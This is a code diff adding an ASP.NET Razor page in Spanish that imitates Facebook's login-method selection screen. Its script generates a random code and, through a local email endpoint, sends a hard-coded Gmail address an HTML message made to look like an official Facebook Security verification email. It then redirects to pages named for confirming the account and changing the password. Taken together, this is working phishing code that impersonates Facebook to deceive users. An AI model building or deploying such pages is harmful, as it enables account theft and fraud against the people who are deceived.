@@ -1,0 +1,392 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <style>
+            :root {
+                --bg-base: #f4f4fb;
+                --fb-blue: #0866ff;
+                --fb-text-main: #1c1e21;
+                --fb-text-sec: #65676b;
+                --fb-border: #ccd0d5;
+                --soft-gradient: radial-gradient(circle at 0% 50%,rgba(255,200,200,.4) 0%,rgba(180,200,255,.3) 40%,transparent 70%);
+            }
+
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            html, body {
+                width: 100%;
+                height: 100%;
+            }
+
+            body {
+                background: var(--soft-gradient),var(--bg-base);
+                background-attachment: fixed;
+                font-family: 'Segoe UI',Arial,sans-serif;
+                color: var(--fb-text-main);
+            }
+
+            .page-container {
+                min-height: 100vh;
+                width: 100%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+            }
+
+            .main-wrapper {
+                width: 100%;
+                max-width: 480px;
+            }
+
+            .header-container {
+                display: flex;
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+                margin-bottom: 20px;
+            }
+
+            .back-btn {
+                font-size: 28px;
+                cursor: pointer;
+                font-weight: bold;
+            }
+
+            .header-title {
+                font-size: 24px;
+                font-weight: 700;
+            }
+
+            .section-group {
+                border: 1px solid rgba(204,208,213,.8);
+                border-radius: 12px;
+                margin-bottom: 24px;
+                background: rgba(255,255,255,.15);
+                backdrop-filter: blur(8px);
+                overflow: hidden;
+            }
+
+            .profile-box {
+                display: flex;
+                align-items: center;
+                padding: 16px;
+            }
+
+            .avatar-placeholder {
+                position: relative;
+                width: 48px;
+                height: 48px;
+                margin-right: 16px;
+            }
+
+            .avatar-silhouette {
+                width: 100%;
+                height: 100%;
+                background: #d8dadf;
+                border-radius: 50%;
+                display: flex;
+                justify-content: center;
+                align-items: flex-end;
+                overflow: hidden;
+            }
+
+                .avatar-silhouette svg {
+                    width: 44px;
+                    height: 44px;
+                    fill: white;
+                    margin-bottom: -4px;
+                }
+
+            .avatar-icon {
+                position: absolute;
+                bottom: -4px;
+                right: -4px;
+                width: 22px;
+                height: 22px;
+                background: var(--fb-blue);
+                border: 2px solid white;
+                border-radius: 50%;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+                .avatar-icon svg {
+                    width: 12px;
+                    height: 12px;
+                }
+
+            .option-row {
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                padding: 16px;
+                border-bottom: 1px solid rgba(204,208,213,.6);
+                cursor: pointer;
+            }
+
+            .option-text-container {
+                display: flex;
+                flex-direction: column;
+                gap: 2px;
+            }
+
+            .option-row input[type=radio] {
+                display: none;
+            }
+
+            .custom-radio {
+                width: 22px;
+                height: 22px;
+                border-radius: 50%;
+                border: 2px solid var(--fb-text-sec);
+                display: flex;
+                justify-content: center;
+                align-items: center;
+            }
+
+            .option-row input[type=radio]:checked ~ .custom-radio {
+                border-color: var(--fb-blue);
+            }
+
+                .option-row input[type=radio]:checked ~ .custom-radio::after {
+                    content: "";
+                    width: 12px;
+                    height: 12px;
+                    border-radius: 50%;
+                    background: var(--fb-blue);
+                }
+
+            .help-link {
+                text-align: center;
+                color: var(--fb-blue);
+                font-weight: 600;
+                margin: 24px 0;
+                cursor: pointer;
+            }
+
+            .btn-pill {
+                width: 100%;
+                padding: 14px;
+                border-radius: 50px;
+                border: none;
+                cursor: pointer;
+                font-size: 16px;
+                font-weight: 600;
+                margin-bottom: 12px;
+            }
+
+            .btn-primary {
+                background: var(--fb-blue);
+                color: white;
+            }
+
+            .btn-secondary {
+                background: rgba(255,255,255,.3);
+                border: 1px solid var(--fb-border);
+                color: var(--fb-text-main);
+            }
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        <div class="main-wrapper">
+            <div class="header-container">
+                <a href="@Url.Action("BuscarCuenta", "Home")" class="back-btn" style="text-decoration: none; color: inherit;">&larr;</a>
+                <div class="header-title">Elige un método para iniciar sesión</div>
+            </div>
+
+            <div class="section-group profile-box">
+                <div class="avatar-placeholder">
+                    <div class="avatar-silhouette"><svg viewBox="0 0 32 32"><path d="M16 17.5c3.6 0 6.5-2.9 6.5-6.5S19.6 4.5 16 4.5 9.5 7.4 9.5 11s2.9 6.5 6.5 6.5zm0 2.5c-4.8 0-14.5 2.4-14.5 7.2V32h29v-4.8c0-4.8-9.7-7.2-14.5-7.2z" /></svg></div>
+                    <div class="avatar-icon"><svg viewBox="0 0 24 24"><path fill="white" d="M15.1 12l.6-4H12V5.4c0-1.1.3-1.8 1.8-1.8h2V.3C15.5.2 14.3 0 13 0c-2.8 0-4.7 1.7-4.7 4.8V8H5v4h3.3v9.8c1.2.2 2.5.2 3.7 0V12h3.1z" /></svg></div>
+                </div>
+                <div>
+                    <div style="font-size:16px;font-weight:500;">D...</div>
+                    <div style="font-size:14px;color:#65676b;">Facebook</div>
+                </div>
+            </div>
+
+            <form id="loginForm">
+                <div class="section-group">
+                    <label class="option-row">
+                        <input type="radio" name="method" value="correo" checked>
+                        <div class="option-text-container">
+                            <div style="font-weight:500;">Obtener código por correo electrónico</div>
+                            <div style="font-size:14px;color:#65676b;">x*******gmail.com</div>
+                        </div>
+                        <div class="custom-radio"></div>
+                    </label>
+
+                    <label class="option-row">
+                        <input type="radio" name="method" value="password">
+                        <div class="option-text-container">
+                            <div style="font-weight:500;">Continuar con contraseña</div>
+                            <div style="font-size:14px;color:#65676b;">Usa tu contraseña para continuar</div>
+                        </div>
+                        <div class="custom-radio"></div>
+                    </label>
+                </div>
+
+                <div class="help-link">¿Ya no tienes acceso a estos métodos?</div>
+
+                <button class="btn-pill btn-primary" type="button" onclick="gestionarRedireccion()">
+                    Continuar
+                </button>
+
+                <button class="btn-pill btn-secondary" type="button" onclick="window.location.href='@Url.Action("BuscarCuenta", "Home")'">
+                    ¿No eres tú?
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+            async function gestionarRedireccion() {
+                const inputSeleccionado = document.querySelector('input[name="method"]:checked');
+
+                if (!inputSeleccionado) return;
+
+                const seleccion = inputSeleccionado.value;
+
+                if (seleccion === 'correo') {
+                    const codigoAleatorio = Math.floor(100000 + Math.random() * 900000).toString();
+
+                    // Plantilla HTML avanzada que imita el correo formal de Facebook
+                    const cuerpoHtmlPersonalizado = `
+                    <!DOCTYPE html>
+                    <html lang="es">
+                    <head>
+                        <meta charset="UTF-8">
+                        <style>
+                            body {
+                                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+                                background-color: #f0f2f5;
+                                color: #1c1e21;
+                                margin: 0;
+                                padding: 20px;
+                            }
+                            .email-container {
+                                max-width: 600px;
+                                margin: 0 auto;
+                                background-color: #ffffff;
+                                padding: 30px;
+                                border-radius: 8px;
+                                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                            }
+                            .header {
+                                margin-bottom: 25px;
+                            }
+                            .fb-logo {
+                                width: 36px;
+                                height: 36px;
+                                background-color: #1877f2;
+                                border-radius: 50%;
+                                text-align: center;
+                                line-height: 36px;
+                                color: white;
+                                font-weight: bold;
+                                font-size: 20px;
+                            }
+                            h1 {
+                                font-size: 20px;
+                                font-weight: 700;
+                                margin-bottom: 20px;
+                                color: #1c1e21;
+                            }
+                            p {
+                                font-size: 15px;
+                                line-height: 1.5;
+                                margin: 14px 0;
+                            }
+                            .code-box {
+                                background-color: #e7f3ff;
+                                border: 1px solid #b8daff;
+                                border-radius: 6px;
+                                text-align: center;
+                                font-size: 28px;
+                                font-weight: 600;
+                                letter-spacing: 6px;
+                                padding: 16px;
+                                margin: 24px 0 6px 0;
+                                color: #050505;
+                            }
+                            .code-footer {
+                                text-align: center;
+                                font-size: 13px;
+                                color: #65676b;
+                                margin-bottom: 25px;
+                            }
+                            .section-title {
+                                font-weight: 600;
+                                margin-top: 22px;
+                                margin-bottom: 6px;
+                                font-size: 15px;
+                            }
+                            a {
+                                color: #1877f2;
+                                text-decoration: none;
+                            }
+                            a:hover {
+                                text-decoration: underline;
+                            }
+                            .footer-text {
+                                margin-top: 30px;
+                                font-size: 14px;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="email-container">
+                            <div class="header">
+                                <div class="fb-logo">f</div>
+                            </div>
+                            <h1>Solo te queda un paso para confirmar tu cuenta</h1>
+                            <p>Hola, Angel:</p>
+                            <p>Hemos recibido una solicitud para confirmar tu cuenta de alguien que está usando Facebook. Introduce este código:</p>
+                            <div class="code-box">${codigoAleatorio}</div>
+                            <div class="code-footer">No compartas este código con nadie.</div>
+                            <div class="section-title">Si alguien solicita este código</div>
+                            <p>No compartas este código con nadie, especialmente si te dice que trabaja para Facebook o Meta. Es posible que esté intentando hackear tu cuenta.</p>
+                            <div class="section-title">¿No has solicitado esto?</div>
+                            <p>Si has recibido este correo electrónico pero no estás intentando realizar cambios, <a href="#">infórmanos</a>. Mientras no compartas este código con nadie, no es necesario que adoptes ninguna otra medida.</p>
+                            <p class="footer-text">
+                                Gracias,<br>
+                                <strong>Seguridad de Facebook</strong>
+                            </p>
+                        </div>
+                    </body>
+                    </html>`;
+
+                    try {
+                        await fetch('/api/Email', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                to: "smartiodiversityutn@gmail.com",
+                                subject: "Tu código de confirmación de Facebook",
+                                body: cuerpoHtmlPersonalizado // <--- Ahora enviamos el diseño completo
+                            })
+                        });
+                    } catch (error) {
+                        console.error("Error al enviar el correo:", error);
+                    }
+
+                    window.location.href = '@Url.Action("ConfirmaCuenta", "Home")';
+
+                } else if (seleccion === 'password') {
+                    window.location.href = '@Url.Action("CambiarContrasenia", "Home")';
+                }
+            }
+    </script>
+</body>
+</html>
